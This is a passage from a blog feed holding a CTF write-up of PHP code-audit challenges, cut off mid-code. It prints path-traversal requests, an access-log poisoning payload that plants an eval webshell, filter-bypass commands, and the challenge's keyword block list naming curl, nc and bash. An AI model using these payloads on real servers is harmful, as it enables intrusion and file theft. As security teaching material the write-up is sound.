<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Extrader的小站</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.extrader.top/"/>
  <updated>2020-07-14T10:45:45.514Z</updated>
  <id>https://www.extrader.top/</id>
  
  <author>
    <name>Extrader</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>36D杯五道代码审计题</title>
    <link href="https://www.extrader.top/2020/06/04/36D%E6%9D%AF%E4%BA%94%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/"/>
    <id>https://www.extrader.top/2020/06/04/36D%E6%9D%AF%E4%BA%94%E9%81%93%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98/</id>
    <published>2020-06-03T16:00:00.000Z</published>
    <updated>2020-07-14T10:45:45.514Z</updated>
    
    <content type="html"><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p><a id="more"></a><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p><pre class=" language-php"><code class="language-php">visit all_info_u_want<span class="token punctuation">.</span>php <span class="token keyword">and</span> you will get all information you want<span class="token operator">=</span> <span class="token operator">=</span>Thinking that it may be difficult<span class="token punctuation">,</span> i decided to show you the source code<span class="token punctuation">:</span><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//give you all information you want</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'all_info_i_want'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"/var/www/html/"</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//really baby include</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span>really really really baby challenge right<span class="token operator">?</span> </code></pre><p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p><p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p><p><code>flag{this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself}</code></p><p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p><p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p><pre><code>GET /all_info_u_want.php?file=../../../../../../../../var/log/nginx/access.log HTTP/1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag{&quot;</code>，得到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 获取变量的整数值</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 反转字符串</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^0-9.-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token markup">&lt;= -999999999999999999 || $numPositve ></span><span class="token operator">=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tail"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"sort"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span class="token punctuation">,</span> <span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"快到非洲了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p><ul><li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li><li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li><li>num在经过取整和反转字符串后取整后的数字需要相等</li><li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li></ul><p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p><p>以下提供两种绕过方式：</p><pre><code>00.01000000000000000.00000000000000010</code></pre><p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>是可以返回true的，但是我在本地测试到</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>就返回false了，不知道什么鬼-.-</p><p>再绕过第二个if</p><p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p><p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p><pre><code>0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>再到最后get flag</p><p>过滤了挺多的命令，但是还是可以绕过：</p><pre class=" language-shell"><code class="language-shell">nl</flag|nlrev</flag|rev</code></pre><p>随后即可拿到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token variable">$k</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$j</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$len</span><span class="token operator">-</span><span class="token variable">$j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$l</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$l</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$numPositve</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$numReverse</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[^0-9.]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\./"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/\-/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[-]/'</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"没有这样的数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$num</span> <span class="token operator">!=</span> <span class="token variable">$numPositve</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$numPositve</span> <span class="token markup">&lt;= -999999999999999999 || $numPositve ></span><span class="token operator">=</span> <span class="token number">999999999999999999</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//在64位系统中 intval()的上限不是2147483647 省省吧</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"非洲欢迎你2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$numPositve</span> <span class="token operator">===</span> <span class="token variable">$numReverse</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">isPalindrome</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"金钱解决不了穷人的本质问题"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//level 2</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$md5</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'md5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$md5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string">"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"去非洲吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//get flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'get_flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get_flag</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$get_flag</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"36dCTFShow"</span><span 